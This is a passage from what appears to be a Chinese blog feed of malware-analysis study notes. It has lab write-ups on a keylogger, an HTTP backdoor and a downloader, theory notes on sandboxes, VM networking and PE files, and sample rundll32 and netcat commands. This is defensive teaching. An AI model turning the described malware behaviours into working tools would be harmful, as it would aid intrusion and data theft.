aria-hidden="true">image-20231014105200733</figcaption></figure><h2 id="详细分析-2">详细分析</h2><p>对于这个实验，我们首先启动ProcessExplorer和procmon工具.<code>Lab03-03.exe</code>可以从命令提示符运行，或者通过双击图标运行.一旦运行之后，<code>La03-03.exe</code>应该在ProcessExplorer中看得到.请注意它是如何创建子进程<code>svchost.exe</code>的，创建之后它便退出了，将<code>svchost.exe</code>进程继续作为一个“孤儿”进程(没有父进程的进程）执行.<code>svchost.exe</code>作为“孤儿”进程是极不寻常而且是高度可疑的.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122882.png"alt="image-20231014110346346" /><figcaption aria-hidden="true">image-20231014110346346</figcaption></figure><p>查看该进程属性，从这个相同的属性页面中，我们选择Strings同时显示在磁盘镜像中和内存镜像中可执行文件的字符串列表.通过在Image和Memory单选按钮之间切换，可以看出两者镜像中的显著差异.内存镜像中有一些可疑字符串，如日志、键盘操作符，表明这个程序很可能是一个击键记录器.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122883.png"alt="image-20231014110948757" /><figcaption aria-hidden="true">image-20231014110948757</figcaption></figure><p>为进行测试，创建文本文件，之后在进程监视器中设置过滤条件查看结果，发现该进程正在写一个日志文件，这与在<code>svchos.exe</code>“孤儿”进程的内存镜像视图中看到的一个字符串相同，打开该日志文件，显示出了刚才在记事本中的击键记录.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122884.png"alt="image-20231014111326609" /><figcaption aria-hidden="true">image-20231014111326609</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122885.png"alt="image-20231014111416534" /><figcaption aria-hidden="true">image-20231014111416534</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122886.png"alt="image-20231014111459029" /><figcaption aria-hidden="true">image-20231014111459029</figcaption></figure><h1 id="lab-03-04">Lab 03-04</h1><h2 id="简要答案-3">简要答案</h2><p>Q1：当你运行这个文件时，会发生什么呢?</p><p>Q2：是什么原因造成动态分析无法有效实施?</p><p>Q3：是否有其他方式来运行这个程序?</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122887.png"alt="image-20231014112009958" /><figcaption aria-hidden="true">image-20231014112009958</figcaption></figure><h2 id="详细分析-3">详细分析</h2><p>我们开始使用静态分析基础技术，研究PE文件结构和字符串列表.我们看到这个恶意代码导入了一些联网功能函数、服务操作函数和注册表操作函数.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122888.png"alt="image-20231014113403301" /><figcaption aria-hidden="true">image-20231014113403301</figcaption></figure><p>在下面的列表中，我们关注到一些有趣的字符串.我们看到域名、注册表位置;像DOWNLOAD、UPLOAD这样的命令字符串，以及HTTP/1.0字符串等.这些表明恶意代码可能是一个HTTP后门程序.字符串-cc、-re、-in应该是一些命令行参数（例如-in可能是install的缩写）.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122889.png"alt="image-20231014113629375" /><figcaption aria-hidden="true">image-20231014113629375</figcaption></figure><p>启动进程浏览器，进程监视器.当我们运行恶意代码后，它立刻进行自我删除.进程浏览器中无特别行为，再查看进程监视器，设置过滤条件，发现该恶意代码创建了一个进程，从而实现自我删除.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122890.png"alt="image-20231014114225466" /><figcaption aria-hidden="true">image-20231014114225466</figcaption></figure><p>尝试使用命令行运行恶意代码，并使用我们在字符串列表中发现的一些命令行参数（-in、-re、-cc），但这些努力都以失败告终，结果程序还是会删除自身.</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>实验篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH03-动态分析基础技术</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/03%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/03%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="沙箱">1 沙箱</h1><ul><li>沙盒技术：用于安全运行程序的安全环境，经常被用于执行和分析非可信的代码</li><li>作用：<ul><li>样本是否对硬盘读写，创建了什么文件</li><li>样本是否进行网络连接，连接什么端口</li><li>创建了哪些进程（系统/用户），进程有哪些API函数调用</li><li>相关的可疑文件大小和MD5</li><li>文件是否加壳压缩</li><li>是否是已知病毒</li></ul></li><li>缺点：<ul><li>只能简单地运行可执行程序，如果需要命令行运行，无法触发</li><li>不能记录所有事件，尤其是需要长时间等待的情况</li><li>恶意代码会进行虚拟机检测</li><li>运行环境需要特定的注册表项或文件</li><li>如果是一个DLL，无法正确调用执行</li><li>操作系统的限制</li><li>结论需要安全人员自己总结</li></ul></li></ul><h1 id="运行恶意代码">2 运行恶意代码</h1><ul><li><p>exe：命令行或双击</p></li><li><p>dll：命令行</p></li><li><p>rundll (window系统自带程序)执行以下步骤：</p><ul><li>分析命令行</li><li>通过 LoadLibrary( ) 加载指定的 DLL</li><li>通过 GetProcAddress( ) 获取<code>entrypoint</code> 函数的地址</li><li>调用<code>entrypoint</code>函数，并传递作为<code>optional arguments</code>的命令行尾</li><li>当<code>entrypoint</code>函数返回时，rundll.exe 将卸载 DLL并退出</li></ul></li><li><p>执行DLL文件中的导出函数</p><ul><li><code>C:\Windows\System32\rundll32.exe ipr32x.dll,Install ServiceName</code></li><li><code>C:\Windows\System32\rundll32.exe rip.dll,Install</code></li><li><code>C:\Windows\System32\rundll32.exe xyzzy.dll,#5</code></li></ul></li></ul><h1 id="进程监视器">3 进程监视器</h1><ul><li>ProcessMonitor是一款Windows平台下优秀的监视工具，该工具提供了一种可监视特定注册表、文件系统、网络、进程以及线程活动的方法</li><li>Process Monitor能够监视所有系统调用并迅速收集信息。因为WindowsOS总是有许多的系统调用，有时候我们获取到的东西毫无价值，</li><li>Process Monitor通过一个过滤选项卡来解决了这个问题。</li></ul><p><strong>下载地址：</strong>https://learn.microsoft.com/zh-cn/sysinternals/downloads/procmon</p><h1 id="进程浏览器">4 进程浏览器</h1><ul><li>ProcessExplorer是一款用来执行动态分析的工具，它能够洞察到系统当前进程</li><li>在运行二进制文件之后创建的一个进程，单击进程可以帮助用户查看进程的变化</li></ul><p><strong>下载地址：</strong>https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</p><h1 id="regshot比较注册表快照">5 Regshot比较注册表快照</h1><p>快照比对方法：</p><ol type="1"><li>对“干净”资源列表做快照</li><li>运行恶意代码（提供较充分的运行时间5分钟）</li><li>对恶意代码运行后的“脏”资源列表做快照</li><li>对比“干净”和“脏”快照，获取恶意代码行为结果</li></ol><ul><li>资源名称列表中的差异：发现新建、删除的行为结果</li><li>资源内容的差异：完整性校验，发现修改的行为结果</li></ul><p><strong>缺点</strong>：无法分析中间行为，粗粒度</p><p><strong>下载地址</strong>：https://sourceforge.net/projects/regshot/</p><h1 id="模拟网络">6 模拟网络</h1><ul><li>目的：避免连接恶意代码的真实服务器（控制服务器）</li><li>工具：<ul><li>ApateDns(FireEye)：ApateDNS是一个用于控制DNS响应的工具，主要用在<strong>本地系统</strong>上的DNS服务器。ApateDNS可以将恶意软件生成的DNS请求重定向到UDP端口53上的指定IP地址的DNS响应。</li><li>nc(Netcat)：作为客户端，最简单的使用方法，”nc hostport”，能建立一个TCP连接，连向指定的主机和端口。作为服务端，“nc -l -p80”，监听任意指定端口的连接请求(inbound connection)，并可做同样的读写操作。很多恶意软件通过端口<strong>80（HTTP）</strong>和<strong>443（HTTPS）</strong>进行通信，因为在大多数系统上，这些端口不会被防火墙阻止。当执行动态恶意软件分析时，可以使用ApateDNS将由恶意软件创建的DNS请求重定向到正在服务器模式下运行Netcat的主机，侦听指定端口上的指定IP地址。</li><li>INetSim：INetSim能够伪造恶意软件可能使用的常见的互联网服务，并回答相应的请求。当恶意软件请求文件时，INetSim将返回该文件。当恶意软件扫描Web服务器时，INetSim将返回IISWeb服务器的名称以保持恶意软件运行。</li></ul></li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://zhuanlan.zhihu.com/p/24923630">动态恶意软件分析工具介绍</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Chapter_1L</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%AE%9E%E9%AA%8C%E7%AF%87/Chapter_1L/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%AE%9E%E9%AA%8C%E7%AF%87/Chapter_1L/</url>
    
    <content type="html"><![CDATA[<h1 id="lab-01-01">Lab 01-01</h1><h2 id="简要答案">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458503.png"alt="image-20231029105056073" /><figcaption aria-hidden="true">image-20231029105056073</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458505.png"alt="image-20231029105108794" /><figcaption aria-hidden="true">image-20231029105108794</figcaption></figure><h2 id="详细分析">详细分析</h2><p>上传文件至https://www.virustotal.com/，查看分析结果，基本确认是病毒文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458506.png"alt="image-20231029093502774" /><figcaption aria-hidden="true">image-20231029093502774</figcaption></figure><p>使用PETools进行分析，编译时间保存在<code>IMAGE_NT_HEADERS-&gt;IMAGE_FILE_HEADER-&gt;Time Date Stamp</code>字段.上图为lab01-01.exe，下图为lab01-01.dll，两者编译时间十分接近，说明同属于一个恶意代码包.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458507.png"alt="image-20231029110839606" /><figcaption aria-hidden="true">image-20231029110839606</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458508.png"alt="image-20231029110944278" /><figcaption aria-hidden="true">image-20231029110944278</figcaption></figure><p>使用PEiD查看，未被加壳.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458509.png"alt="image-20231029111230564" /><figcaption aria-hidden="true">image-20231029111230564</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458510.png"alt="image-20231029111245648" /><figcaption aria-hidden="true">image-20231029111245648</figcaption></figure><p>使用Depends查看exe文件导入表，发现一些与文件操作相关的函数，以及FindFirstFile和FindNextFile，表明这个程序在搜索文件系统和复制文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458511.png"alt="image-20231029111849424" /><figcaption aria-hidden="true">image-20231029111849424</figcaption></figure><p>使用strings查看exe文件字符串列表，发现可疑路径<code>kerne1.dll</code>（1代替了l）.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458512.png"alt="image-20231029112339801" /><figcaption aria-hidden="true">image-20231029112339801</figcaption></figure><p>查看dll文件导入表和字符串列表.Kernel32.DLL中框选的两个函数普遍在后门程序中使用，WS2_32表明有联网操作.字符串列表中发现一个IP地址.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458513.png"alt="image-20231029112900307" /><figcaption aria-hidden="true">image-20231029112900307</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458514.png"alt="image-20231029113422934" /><figcaption aria-hidden="true">image-20231029113422934</figcaption></figure><h1 id="lab-01-02">Lab 01-02</h1><h2 id="简要答案-1">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458515.png"alt="image-20231029113927070" /><figcaption aria-hidden="true">image-20231029113927070</figcaption></figure><h2 id="详细分析-1">详细分析</h2><p>上传文件至https://www.virustotal.com/，查看分析结果，基本确认是病毒文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458516.png"alt="image-20231029114703781" /><figcaption aria-hidden="true">image-20231029114703781</figcaption></figure><p>使用PEiD进行深度扫描，得到文件加壳信息.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458517.png"alt="image-20231029114812766" /><figcaption aria-hidden="true">image-20231029114812766</figcaption></figure><p>使用free UPX进行脱壳.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458518.png"alt="image-20231029115311898" /><figcaption aria-hidden="true">image-20231029115311898</figcaption></figure><p>查看该程序导入表和字符串列表.得到该恶意程序会创建一个服务，并且有联网操作.字符串列表中看到一个网址，以及Malservice字符串，可能是创建的服务名称.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458519.png"alt="image-20231029115446782" /><figcaption aria-hidden="true">image-20231029115446782</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458520.png"alt="image-20231029115501764" /><figcaption aria-hidden="true">image-20231029115501764</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458521.png"alt="image-20231029115624967" /><figcaption aria-hidden="true">image-20231029115624967</figcaption></figure><h1 id="lab-01-03">Lab 01-03</h1><h2 id="简要答案-2">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458522.png"alt="image-20231029140804386" /><figcaption aria-hidden="true">image-20231029140804386</figcaption></figure><h2 id="详细分析-2">详细分析</h2><p>上传文件至https://www.virustotal.com/，查看分析结果，基本确认是病毒文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458523.png"alt="image-20231029141913268" /><figcaption aria-hidden="true">image-20231029141913268</figcaption></figure><p>使用PEiD查看加壳信息，然后查看导入表，发现仅有两个函数，加壳文件往往只有这两个导入函数.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458524.png"alt="image-20231029142003062" /><figcaption aria-hidden="true">image-20231029142003062</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458525.png"alt="image-20231029142334143" /><figcaption aria-hidden="true">image-20231029142334143</figcaption></figure><h1 id="lab-01-04">Lab 01-04</h1><h2 id="简要答案-3">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458526.png"alt="image-20231029142553301" /><figcaption aria-hidden="true">image-20231029142553301</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458527.png"alt="image-20231029142603196" /><figcaption aria-hidden="true">image-20231029142603196</figcaption></figure><h2 id="详细分析-3">详细分析</h2><p>上传文件至https://www.virustotal.com/，查看分析结果，基本确认是病毒文件，并且与下载器相关.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458528.png"alt="image-20231029143928383" /><figcaption aria-hidden="true">image-20231029143928383</figcaption></figure><p>使用PEiD查看，文件未被加壳.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458529.png"alt="image-20231029144119268" /><figcaption aria-hidden="true">image-20231029144119268</figcaption></figure><p>使用Depends查看导入表，advapi32.dll的导入函数告诉我们程序做了一些与权限有关的操作.kernel32.dll的导入函数告诉我们程序从资源节中装载数据，并写文件到磁盘中，接着执行磁盘上的一个文件（WinExec）.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458530.png"alt="image-20231029144303728" /><figcaption aria-hidden="true">image-20231029144303728</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458531.png"alt="image-20231029144532400" /><figcaption aria-hidden="true">image-20231029144532400</figcaption></figure><p>使用strings查看字符串列表.看到一个网址，可能是保存下载恶意代码的网络位置.以及一个路径，结合GetWindowsDirectory系统调用，程序可能在该位置创建或修改了文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458532.png"alt="image-20231029144842764" /><figcaption aria-hidden="true">image-20231029144842764</figcaption></figure><p>使用ResourceHacker工具进行分析，图中字符串是在所有PE文件开始的DOS头部中都会包含的错误信息，得出结论，这一资源其实是内嵌的另一个可执行文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458533.png"alt="image-20231029145237236" /><figcaption aria-hidden="true">image-20231029145237236</figcaption></figure><p>导出为二进制文件，继续使用PEiD分析其导入表，看到URLDownloadToFile函数，这是一个恶意下载器普遍使用的函数.并且调用了WinExec函数，可能执行了下载到的文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458534.png"alt="image-20231029145617387" /><figcaption aria-hidden="true">image-20231029145617387</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458535.png"alt="image-20231029145747097" /><figcaption aria-hidden="true">image-20231029145747097</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>实验篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH02-在虚拟机中分析恶意代码</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/02%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/02%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="虚拟机概述">1 虚拟机概述</h1><ul><li>概念：VirtualMachine，指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。</li><li>软件：VMware(VMware ACE）、Xen、VirtualBox和KVM等，它们都能在Windows系统上虚拟出多个计算机。</li><li>虚拟机监视器（Virtual MachineMonitor，VMM）是虚拟机技术的核心，它是一层位于操作系统和计算机硬件之间的代码，用来将硬件平台分割成多个虚拟机。主要作用是隔离并且管理上层运行的多个虚拟机，仲裁它们对底层运行在特权模式硬件的访问，并为每个客户操作系统虚拟一套独立于实际硬件的虚拟硬件环境（包括：处理器、内存、I/O设备等）。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153628.png"alt="image-20231012110721542" /><figcaption aria-hidden="true">image-20231012110721542</figcaption></figure><h1 id="虚拟机网络模式">2 虚拟机网络模式</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153629.png"alt="image-20231012112120331" /><figcaption aria-hidden="true">image-20231012112120331</figcaption></figure><h2 id="bridged桥接模式">2.1 Bridged（桥接模式）</h2><ul><li>在bridged模式下，VMWare虚拟出来的虚拟机就像是局域网中的一台独立的主机，它可以访问网内任何一台机器。主机网卡和虚拟网卡的IP地址处于同一个网段，子网掩码、网关、DNS等参数都相同。</li><li>在此种模式下，虚拟机内部的网卡（例如linux下的eth0)直接连到了物理网卡所在的网络上，可以想象为虚拟机和host机处于对等的地位，在网络关系上是平等的，没有谁在谁后面的问题。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153630.png"alt="image-20231012112631034" /><figcaption aria-hidden="true">image-20231012112631034</figcaption></figure><h2 id="nat地址转换模式">2.2 NAT（地址转换模式）</h2><ul><li>桥接模式配置简单，但如果网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了，这时候NAT模式是最好的选择。</li><li>NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。就是让虚拟系统借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153631.png"alt="image-20231012113616352" /><figcaption aria-hidden="true">image-20231012113616352</figcaption></figure><h2 id="host-only仅主机模式">2.3 Host-Only（仅主机模式）</h2><ul><li><p>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMwareNetwork AdapterVMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153632.png"alt="image-20231012114151982" /><figcaption aria-hidden="true">image-20231012114151982</figcaption></figure></li></ul><h1 id="搭建虚拟机环境">3 搭建虚拟机环境</h1><ul><li>Apatedns：ApateDNS是一个用于控制DNS响应的工具，主要用在本地系统上的DNS服务器。ApateDNS可以欺骗由恶意软件生成的DNS请求至UDP端口53上的指定IP地址。</li><li>Inetsim：INetSim是一个基于Linux的工具，主要用于恶意软件分析，它可以模拟最常见的互联网服务，如http、https、DNS、FTP以及其他的。在Windows机器上执行动态恶意软件分析时，你可以使用和恶意软件分析机器在同一网络中的虚拟机来运行INetSim。INetSim能够伪造恶意软件可能使用的常见的互联网服务，并回答相应的请求。</li></ul><p>参考教程：</p><ol type="1"><li>https://www.cnblogs.com/hyq20135317/p/5515675.html</li><li><ahref="https://blog.csdn.net/m0_46687377/article/details/120733392">恶意代码分析实战——使用Apatedns和Inetsim模拟网络环境_妙蛙种子吃了都会妙妙妙的妙脆角的博客-CSDN博客</a></li></ol><h1 id="使用vmware-进行恶意代码分析的风险">4 使用VMware进行恶意代码分析的风险</h1><ul><li>虚拟机探测：恶意代码使用反虚拟机技术，使分析变得更加困难</li><li>虚拟机逃逸：虚拟机软件本身具有漏洞，有可能被恶意代码利用</li><li>信息破坏：未知风险，无论如何使用非敏感机器</li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://zhuanlan.zhihu.com/p/65103100">“桥接”和“NAT”方式区别 -知乎 (zhihu.com)</a></li><li><ahref="https://www.cnblogs.com/zhangweimee/p/9467436.html">Vmware虚拟机三种网络模式详解- 醉城、 - 博客园 (cnblogs.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH01-静态分析基础技术</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/01%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/01%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="反病毒引擎扫描">1 反病毒引擎扫描</h1><ul><li>原理：依靠一个已知恶意代码可识别片段的特征数据库（病毒文件特征库），以及基于行为与模式匹配的分析（启发式检测），来识别可疑文件.</li><li>具体使用：<ul><li>使用反病毒软件进行检测</li><li>开源恶意代码扫描引擎ClamAV</li><li>从反病毒厂商获得已知恶意代码的分析报告和结果</li><li><ahref="https://www.virustotal.com/">VirusTotal</a>：允许上传一个文件，然后调用多个反病毒引擎来进行扫描</li></ul></li></ul><h1 id="哈希值">2 哈希值</h1><ul><li>哈希是一种用来唯一标识恶意代码的常用方法</li><li>恶意代码样本通过一个哈希程序，会产生出一段用于唯一标识这个样本的独特哈希值（类似指纹）</li><li>常用哈希函数：MD5、SHA-1</li></ul><h1 id="查找字符串">3 查找字符串</h1><ul><li>程序中的字符串就是一段可打印的字符序列，其中会包含很多信息，比如弹出的消息，读取的位置，链接的URL等。</li><li>存储方式：ASCLL、Unicode</li><li>两种类型格式都以NULL结束符，表示字符串是完整的。ASCII字符串每个字符使用一个字节，Unicode使用两个字节。</li><li>使用：strings -查找目标文件或二进制文件中的可显示字符串.注意：有些时候检测到的并非是真正的字符串，可能是内存地址，CPU指令序列.</li></ul><h1 id="加壳与混淆恶意代码">4 加壳与混淆恶意代码</h1><ul><li>合法程序通常会包含很多字符串，而由被加壳或者混淆的恶意代码直接分析获得的可打印字符串则很少</li><li>加壳和混淆代码通常至少会包含LoadLibrary和GetProcAddress函数，它们是用来加载和使用其他函数功能的</li></ul><h2 id="文件加壳">4.1 文件加壳</h2><p>当加壳程序运行时，会首先运行一小段脱壳代码，来解压缩加壳的文件，然后再运行脱壳后的文件。左边文件是可执行程序源文件，右边是加壳后的可执行程序。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049831.png"alt="image-20231012102949934" /><figcaption aria-hidden="true">image-20231012102949934</figcaption></figure><h2 id="使用peid检测加壳">4.2 使用PEiD检测加壳</h2><p>检测加壳器的类型，或用来链接应用程序的编译器类型</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049832.png"alt="image-20231012103355802" /><figcaption aria-hidden="true">image-20231012103355802</figcaption></figure><h1 id="pe文件格式">5 PE文件格式</h1><ul><li>PE（PortableExecute）文件格式是windows可执行文件、对象代码和DLL所使用的标准格式，常见的有DLL，EXE，OCX，SYS等.</li><li>PE是指32位可执行文件，64位的可执行文件称为PE+或者PE32+，并非PE64.</li><li>PE文件以一个文件头开始，其中包含代码信息、应用程序类型、所需的库函数与空间要求.</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049833.png"alt="image-20231012103534449" /><figcaption aria-hidden="true">image-20231012103534449</figcaption></figure><h1 id="链接库与函数">6 链接库与函数</h1><ul><li><strong>导入函数</strong>也叫引入函数，引入函数被该模块调用，但它又不在该模块中，调用模块中只包含该函数的一些信息，比如函数名以及它所在的模块（链接库）名等信息.</li><li><strong>导入表</strong>，导入函数相关信息都保存在PE文件中的导入表中.要找到PE文件的导入表，必须先找到datadirectory，即数据目录.</li></ul><h2 id="静态链接运行时链接与动态链接">6.1静态链接、运行时链接与动态链接</h2><ul><li><strong>静态</strong>链接：在生成可执行程序时，就把库中的内容加入到程序中。在程序运行前，先将其目标模块及它们所需的库函数，链接成一个完整的装配模块，以后不再拆开的链接方式。</li><li><strong>动态</strong>链接：用户源程序编译后得到的一组目标模块，在装入内存时釆用边装入边链接的链接方式。装入一个目标模块时，若发生一个外部模块调用，将引起装入程序去找出相应的外部目标模块，并将它装入内存，还要修改目标模中的相对地址。</li><li><strong>运行时</strong>链接：有些目标模块的链接，推迟到执行时才进行。即在执行过程中，若发现一个被调用模块尚未装入内存时，由OS去找到该模块，将它装入内存，并把它连接到调用者模块上。对某些目标模块的链接，是在程序执行中需要该目标模块时，才对它进行的链接。</li></ul><h2 id="dependency-walker">6.2 Dependency Walker</h2><ul><li><p>该工具用于探索动态链接函数</p></li><li><p>常见DLL程序</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049834.png"alt="image-20231012104028617" /><figcaption aria-hidden="true">image-20231012104028617</figcaption></figure></li></ul><h2 id="导入函数">6.3 导入函数</h2><p>PE文件头包含可执行文件使用的特定函数相关信息。导入函数描述可执行文件会使用哪些WindowsAPI函数，也就是可能会有什么样的操作。</p><h2 id="导出函数">6.4 导出函数</h2><p>用来与其他程序和代码进行交互时所使用的。一个DLL会出现一个或多个功能函数，然后将其导出，供别的程序导入并使用。</p><h1 id="pe文件头与节">7 PE文件头与节</h1><h2 id="文件头">7.1 文件头</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291021656.png"alt="image-20231012104534105" /><figcaption aria-hidden="true">image-20231012104534105</figcaption></figure><h2 id="分节">7.2 分节</h2><ul><li>.text：包含CPU执行指令。所有其他节存储数据和支持性的信息。一般来说，这是唯一可以执行的节，也应该是唯一包含代码的节。</li><li>.rdata：包含导入与导出函数信息，与DependencyWalker和PeView工具所获得的信息是相同的。还可以存储程序所使用的其他只读数据。有些文件包括.idata和.edata节来存储导入导出信息。</li><li>.data：包含程序的全局数据，可以从程序的任何地方访问到。本地数据并不存储在这个节中，而是在PE文件的某个其他位置上。</li><li>.rsrc：包含由可执行文件所使用的资源，不能执行，比如：图标、图片、菜单项、字符串等。字符串也可以存储在主程序中。存放在这是为提供多语种支持。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049835.png"alt="image-20231012104458546" /><figcaption 